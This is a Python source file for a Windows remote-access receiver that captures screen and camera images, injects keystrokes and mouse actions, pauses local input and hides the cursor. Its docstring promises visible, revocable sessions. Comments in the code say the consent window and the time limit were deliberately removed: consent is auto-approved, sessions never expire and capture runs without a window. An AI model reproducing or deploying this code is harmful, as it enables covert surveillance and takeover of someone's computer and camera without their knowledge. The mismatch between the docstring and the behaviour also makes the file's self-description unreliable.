"""Visible, revocable sessions for remote screen/camera access and keyboard input."""

import base64
import ctypes
import json
import math
import os
import secrets
import subprocess
import threading
import time
from contextlib import contextmanager


SCOPES = {"screen": "屏幕共享", "camera": "摄像头共享", "input": "远程键盘"}


class ConsentSession:
    """无确认会话。

    原版会在本机弹一个可见窗口等人点“允许”，并带 300 秒时长上限。
    按需求这里全部去掉：
      * 不做任何确认，会话一创建就是已授权状态
      * 不设时长上限（duration=None 表示永不过期）
      * 不弹任何窗口
    仍然保留会话对象，因为上层要用 sid 管理“当前有哪些共享在跑”。
    """

    def __init__(self, scope, peer, duration=None):
        self.sid = secrets.token_urlsafe(24)
        self.scope = scope
        self.peer = peer
        self.duration = duration       # None = 不限制
        self.stopped = threading.Event()
        self.created = time.monotonic()
        self.last_active = time.monotonic()
        self.client_id = ""
        self.on_close = None

    def alive(self):
        return not self.stopped.is_set()

    def close(self):
        self.stopped.set()
        if self.on_close:
            self.on_close()


class WindowsBackend:
    message_slots = threading.BoundedSemaphore(3)
    def __init__(self, capture_exe):
        self.capture_exe = capture_exe
        self.guard = None
        self.guard_lock = threading.Lock()
        self.cursor_visibility = None

    def _input(self, callback):
        # Tagged SendInput is accepted from every RPC thread. Long text must not
        # occupy the low-level hook thread, or Windows silently removes hooks
        # after LowLevelHooksTimeout while local input appears to remain paused.
        return callback()

    def local_input(self, action, owner, allowed):
        if action == "pause":
            # Initialize the worker that owns the input hooks and message pump.
            from input_guard import InputGuard
            with self.guard_lock:
                if self.guard is None or not self.guard.thread.is_alive():
                    self.guard = InputGuard()
            return self.guard.pause(owner, allowed)
        if self.guard is None or not self.guard.thread.is_alive():
            return {"paused": False, "remaining": 0}
        return self.guard.release(owner) if action == "release" else self.guard.status(owner)

    def release_local_input(self, owner):
        if self.guard is not None and self.guard.thread.is_alive():
            self.guard.release(owner)

    def cursor(self, owner, hidden, allowed):
        from cursor_visibility import CursorVisibility
        with self.guard_lock:
            if self.cursor_visibility is None:
                self.cursor_visibility = CursorVisibility()
        return self.cursor_visibility.set_hidden(owner, hidden, allowed)

    def release_cursor(self, owner):
        if self.cursor_visibility is not None:
            self.cursor_visibility.set_hidden(owner, False, lambda: False)

    def request_consent(self, session):
        """不再征求本机同意，直接放行，也不启动任何可见窗口。"""
        return True

    def capture(self, scope, device=0):
        if not os.path.isfile(self.capture_exe):
            raise RuntimeError("缺少 LanCmdCapture.exe，请完整更新 Windows 1.5.0 压缩包")
        args = [self.capture_exe, "screen"] if scope == "screen" else [self.capture_exe, "camera", str(device)]
        r = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, timeout=12, creationflags=0x08000000)
        if r.returncode or not r.stdout.startswith(b"\xff\xd8"):
            raise RuntimeError(r.stderr.decode("utf-8", "replace").strip() or "画面获取失败")
        if len(r.stdout) > 4 * 1024 * 1024:
            raise RuntimeError("画面过大")
        return r.stdout

    def cameras(self):
        r = subprocess.run([self.capture_exe, "list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, timeout=10, creationflags=0x08000000)
        if r.returncode:
            raise RuntimeError(r.stderr.decode("utf-8", "replace").strip() or "读取摄像头失败")
        return json.loads(r.stdout.decode("utf-8"))

    def desktop_size(self):
        user = ctypes.WinDLL("user32", use_last_error=True)
        return max(1, user.GetSystemMetrics(78)), max(1, user.GetSystemMetrics(79))

    @staticmethod
    def _mouse_event(flags, x=0, y=0, data=0):
        from ctypes import wintypes as w
        class Mouse(ctypes.Structure):
            _fields_ = [("dx", w.LONG), ("dy", w.LONG), ("data", w.DWORD),
                        ("flags", w.DWORD), ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Keyboard(ctypes.Structure):
            _fields_ = [("vk", w.WORD), ("scan", w.WORD), ("flags", w.DWORD),
                        ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Payload(ctypes.Union):
            _fields_ = [("mouse", Mouse), ("keyboard", Keyboard)]
        class Input(ctypes.Structure):
            _fields_ = [("type", w.DWORD), ("payload", Payload)]
        user = ctypes.WinDLL("user32", use_last_error=True)
        user.SendInput.argtypes = [w.UINT, ctypes.POINTER(Input), ctypes.c_int]
        item = Input(0, Payload(mouse=Mouse(x, y, data & 0xffffffff, flags, 0, 0x4C434D44)))
        if user.SendInput(1, ctypes.byref(item), ctypes.sizeof(Input)) != 1:
            raise RuntimeError("系统拒绝鼠标输入，请检查桌面是否解锁及目标窗口权限")

    def release_mouse(self, button):
        self._input(lambda: self._mouse_event({"left": 0x0004, "right": 0x0010, "middle": 0x0040}[button]))

    def pointer(self, action, x, y, button, delta, allowed):
        return self._input(lambda: self._pointer(action, x, y, button, delta, allowed))

    def _pointer(self, action, x, y, button, delta, allowed):
        if not allowed():
            raise RuntimeError("鼠标控制已结束")
        # Capture includes the entire virtual desktop. ABSOLUTE + VIRTUALDESK
        # maps the normalized image coordinates across monitors, including those
        # left/above the primary display, independently of JPEG downscaling.
        self._mouse_event(0x0001 | 0x8000 | 0x4000, round(x * 65535), round(y * 65535))
        down = {"left": 0x0002, "right": 0x0008, "middle": 0x0020}[button]
        if action == "move":
            return
        if action == "scroll":
            self._mouse_event(0x0800, data=delta * 120)
        elif action == "up":
            self._mouse_event({"left": 0x0004, "right": 0x0010, "middle": 0x0040}[button])
        elif action == "down":
            if not allowed():
                raise RuntimeError("鼠标控制已结束")
            self._mouse_event(down)
        else:
            for _ in range(2 if action == "double_click" else 1):
                try:
                    if not allowed():
                        raise RuntimeError("鼠标控制已结束")
                    self._mouse_event(down)
                finally:
                    self._mouse_event({"left": 0x0004, "right": 0x0010, "middle": 0x0040}[button])

    def keys(self, keys, text, allowed=lambda: True):
        return self._input(lambda: self._keys(keys, text, allowed))

    def _keys(self, keys, text, allowed):
        from ctypes import wintypes as w
        class Keyboard(ctypes.Structure):
            _fields_ = [("vk", w.WORD), ("scan", w.WORD), ("flags", w.DWORD),
                        ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Mouse(ctypes.Structure):
            _fields_ = [("dx", w.LONG), ("dy", w.LONG), ("data", w.DWORD),
                        ("flags", w.DWORD), ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Payload(ctypes.Union):
            _fields_ = [("keyboard", Keyboard), ("mouse", Mouse)]
        class Input(ctypes.Structure):
            _fields_ = [("type", w.DWORD), ("payload", Payload)]
        user = ctypes.WinDLL("user32", use_last_error=True)
        user.SendInput.argtypes = [w.UINT, ctypes.POINTER(Input), ctypes.c_int]
        def send(vk=0, scan=0, flags=0):
            item = Input(1, Payload(keyboard=Keyboard(vk, scan, flags, 0, 0x4C434D44)))
            if user.SendInput(1, ctypes.byref(item), ctypes.sizeof(Input)) != 1:
                raise RuntimeError("系统拒绝输入；请确认电脑已解锁且目标窗口权限不高于接收端")
        if text:
            raw = text.encode("utf-16-le")
            for i in range(0, len(raw), 2):
                if not allowed():
                    raise RuntimeError("本机已停止键盘控制")
                unit = int.from_bytes(raw[i:i + 2], "little")
                send(scan=unit, flags=4)
                send(scan=unit, flags=6)
        else:
            pressed = []
            try:
                for name in keys:
                    if not allowed():
                        raise RuntimeError("本机已停止键盘控制")
                    vk = KEY_CODES[name]
                    send(vk, flags=1 if vk in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2E, 0x5B) else 0)
                    pressed.append(vk)
            finally:
                for vk in reversed(pressed):
                    send(vk, flags=3 if vk in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2E, 0x5B) else 2)

    def message(self, title, text):
        if not self.message_slots.acquire(blocking=False):
            return False
        def display():
            try:
                ctypes.windll.user32.MessageBoxW(None, text, title, 0x40 | 0x10000)
            finally:
                self.message_slots.release()
        threading.Thread(target=display, name="lancmd-message", daemon=True).start()
        return True


KEY_CODES = {"CTRL": 0x11, "ALT": 0x12, "SHIFT": 0x10, "WIN": 0x5B,
             "ENTER": 0x0D, "ESC": 0x1B, "TAB": 9, "SPACE": 0x20, "BACKSPACE": 8,
             "DELETE": 0x2E, "HOME": 0x24, "END": 0x23, "PAGEUP": 0x21, "PAGEDOWN": 0x22,
             "LEFT": 0x25, "UP": 0x26, "RIGHT": 0x27, "DOWN": 0x28}
KEY_CODES.update({c: ord(c) for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"})
KEY_CODES.update({"F%d" % n: 0x6F + n for n in range(1, 13)})
KEY_CODES.update({"OEM_1": 0xBA, "OEM_PLUS": 0xBB, "OEM_COMMA": 0xBC,
                  "OEM_MINUS": 0xBD, "OEM_PERIOD": 0xBE, "OEM_2": 0xBF,
                  "OEM_3": 0xC0, "OEM_4": 0xDB, "OEM_5": 0xDC,
                  "OEM_6": 0xDD, "OEM_7": 0xDE})


class RemoteFeatures:
    def __init__(self, error, logger, capture_exe, backend=None):
        self.error = error
        self.log = logger
        self.backend = backend or WindowsBackend(capture_exe)
        self.supported = os.name == "nt" or backend is not None
        self.pending_consents = threading.BoundedSemaphore(3)
        self.pointer_lock = threading.RLock()
        self.pointer_owners = {}
        self.playback_owner = None
        self.camera_lock=threading.RLock()
        self.camera_sessions={}

    def _check(self, state):
        if not self.supported:
            raise self.error("此功能仅支持 Windows 1.5.0 接收端")
        if not hasattr(state, "remote_sessions"):
            state.remote_sessions = {}

    def session(self, q, state):
        self._check(state)
        action = q.get("action", "begin")
        if action == "keepalive":
            session = state.remote_sessions.get(str(q.get("sid", "")))
            if not session:
                raise self.error("共享已结束", 403)
            self.active(q, state, session.scope)
            return {"active": True}
        if action == "end":
            session = state.remote_sessions.pop(str(q.get("sid", "")), None)
            if session:
                session.close()
            return {"stopped": True}
        if action != "begin" or q.get("scope") not in SCOPES:
            raise self.error("无效的共享请求")
        for sid, session in list(state.remote_sessions.items()):
            if not session.alive():
                session.close()
                state.remote_sessions.pop(sid, None)
        scope = q["scope"]
        # 不再询问本机，也不再限制同时进行的共享数量
        session = ConsentSession(scope, "%s · %s" % (state.peer, state.client_id[-8:]))
        session.client_id = state.client_id
        session.on_close = lambda: self._close_session(session)
        session.approved_at = time.time()
        state.remote_sessions[session.sid] = session
        if scope=="camera":
            with self.camera_lock:self.camera_sessions[session.sid]=session
        self.log.info("开始共享 %s peer=%s client=%s", scope, state.peer, state.client_id)
        return {"sid": session.sid, "scope": scope, "expires_in": None}

    def active(self, q, state, scope, touch=True):
        self._check(state)
        session = state.remote_sessions.get(str(q.get("sid", "")))
        if not session or session.scope != scope or session.client_id != state.client_id or not session.alive():
            raise self.error("共享已停止，请重新开始", 403)
        if touch:
            session.last_active = time.monotonic()
        return session

    @contextmanager
    def camera_guard(self):
        # Wait for an in-flight capture to release its handle, then reject old leases.
        with self.camera_lock:
            sessions=list(self.camera_sessions.values())
            for session in sessions:session.close()
            yield {"camera_sessions":len(sessions)}

    def frame(self, q, state, scope):
        if scope=="camera":
            with self.camera_lock:return self._frame(q,state,scope)
        return self._frame(q,state,scope)

    def _frame(self, q, state, scope):
        self.active(q, state, scope)
        action = q.get("action", "frame")
        if scope == "camera" and action == "list":
            devices = self.backend.cameras()
            self.active(q, state, scope)
            return {"devices": devices}
        if action != "frame":
            raise self.error("无效的画面操作")
        try:
            device = int(q.get("device", 0))
        except (TypeError, ValueError):
            raise self.error("摄像头编号无效")
        if device < 0 or device > 31:
            raise self.error("摄像头编号无效")
        raw = self.backend.capture(scope, device)
        # A local stop or expiry while capture was in flight discards the frame.
        self.active(q, state, scope)
        return {"format": "jpeg", "data": base64.b64encode(raw).decode("ascii")}

    def keyboard(self, q, state):
        session = self.active(q, state, "input")
        text = q.get("text", "")
        keys = q.get("keys", [])
        if not isinstance(text, str) or len(text) > 1000 or "\x00" in text:
            raise self.error("文字最多 1000 字")
        if not isinstance(keys, list) or not 0 <= len(keys) <= 5 or any(not isinstance(k, str) for k in keys):
            raise self.error("按键组合最多 5 个")
        keys = [k.upper() for k in keys]
        if bool(text) == bool(keys) or any(k not in KEY_CODES for k in keys) or len(set(keys)) != len(keys):
            raise self.error("请发送文字或有效按键组合")
        self.backend.keys(keys, text, allowed=session.alive)
        return {"sent": True}

    def local_input(self, q, state):
        session = self.active(q, state, "input")
        action = q.get("action", "status")
        seconds = q.get("seconds", 0)
        if action not in ("pause", "release", "status"):
            raise self.error("无效的本机输入操作")
        if isinstance(seconds, bool) or not isinstance(seconds, int) or seconds != 0:
            raise self.error("已取消定时恢复，请使用手动解除模式（seconds=0）")
        return self.backend.local_input(action, session.sid,
            lambda: session.alive() and time.monotonic() - session.last_active < 12)

    def cursor(self, q, state):
        session = self.active(q, state, "input")
        hidden = q.get("hidden")
        if not isinstance(hidden, bool):
            raise self.error("鼠标指针状态必须为布尔值")
        return self.backend.cursor(session.sid, hidden,
            lambda: session.alive() and time.monotonic() - session.last_active < 12)

    def _close_session(self, session):
        if session.scope=="camera":
            with self.camera_lock:self.camera_sessions.pop(session.sid,None)
        self._release_pointer(session)
        release_cursor = getattr(self.backend, "release_cursor", None)
        if release_cursor:
            try:
                release_cursor(session.sid)
            except Exception:
                # Cursor recovery must never prevent releasing local input.
                self.log.exception("鼠标指针由独立进程继续恢复")
        release = getattr(self.backend, "release_local_input", None)
        if release:
            release(session.sid)

    def _release_pointer(self, session):
        with self.pointer_lock:
            for button, owner in list(self.pointer_owners.items()):
                if owner == session.sid:
                    try:
                        self.backend.release_mouse(button)
                    except Exception:
                        self.log.exception("释放远程鼠标按键失败: %s", button)
                    finally:
                        self.pointer_owners.pop(button, None)

    def pointer(self, q, state, playback=False, allowed=None):
        session = self.active(q, state, "input", touch=not playback)
        action = q.get("action", "click")
        if action not in ("move", "click", "double_click", "down", "up", "scroll"):
            raise self.error("无效的鼠标操作")
        x, y = q.get("x"), q.get("y")
        if any(isinstance(v, bool) or not isinstance(v, (int, float)) or
               not 0 <= v <= 1 or not math.isfinite(v) for v in (x, y)):
            raise self.error("鼠标坐标必须为 0 到 1 的有限数值")
        button = q.get("button", "left")
        if button not in ("left", "right", "middle"):
            raise self.error("无效的鼠标按键")
        delta = q.get("delta", 0)
        if action == "scroll" and (isinstance(delta, bool) or not isinstance(delta, int) or
                                   delta == 0 or abs(delta) > 10):
            raise self.error("滚动步数需为 -10 到 10 的非零整数")
        with self.pointer_lock:
            if self.playback_owner is not None and not playback:
                raise self.error("手势正在等待或回放，请先取消手势")
            if playback and self.playback_owner != session.sid:
                raise self.error("手势回放已取消")
            if any(owner != session.sid for owner in self.pointer_owners.values()):
                raise self.error("其他连接正在拖动，请稍后再试")
            if action in ("click", "double_click") and self.pointer_owners:
                raise self.error("请先结束正在进行的拖动")
            if action == "up" and self.pointer_owners.get(button) != session.sid:
                return {"sent": True}
            if action == "down":
                if button in self.pointer_owners:
                    return {"sent": True}
                self.pointer_owners[button] = session.sid
            try:
                self.backend.pointer(action, float(x), float(y), button, delta, allowed or session.alive)
            except Exception:
                self._release_pointer(session)
                raise
            if action == "up":
                self.pointer_owners.pop(button, None)
        return {"sent": True}

    def message(self, q, state):
        self._check(state)
        text = q.get("text", "")
        title = q.get("title", "手机消息")
        if not isinstance(text, str) or not text.strip() or len(text) > 2000 or "\x00" in text:
            raise self.error("消息需为 1–2000 字")
        if not isinstance(title, str) or len(title) > 60 or "\x00" in title:
            raise self.error("标题最多 60 字")
        self.backend.message(title, text)
        return {"sent": True}

    def close(self, state):
        for session in getattr(state, "remote_sessions", {}).values():
            session.close()
        getattr(state, "remote_sessions", {}).clear()
